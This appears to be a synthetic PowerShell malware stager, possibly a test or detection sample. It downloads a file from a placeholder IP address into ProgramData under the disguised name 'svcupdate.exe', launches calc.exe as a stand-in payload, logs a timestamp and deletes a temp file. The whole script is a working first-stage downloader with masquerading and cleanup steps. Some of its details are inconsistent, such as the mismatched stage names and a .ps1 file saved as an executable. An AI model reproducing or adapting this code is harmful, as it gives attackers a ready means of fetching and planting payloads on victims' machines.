[CmdletBinding()]
param(
    [string]$Stage2Url = 'http://192.0.2.181:80/stage1.ps1',
    [string]$DownloadPath = "C:\ProgramData\svcupdate.exe",
    [int]$StageTimeout = 200
)
$ErrorActionPreference = "Stop"

function Get-Stage1Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $StageResult = Get-Stage1Payload -SourceUrl $Stage2Url -DestinationPath $DownloadPath -TimeoutSec $StageTimeout
    if ($StageResult) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
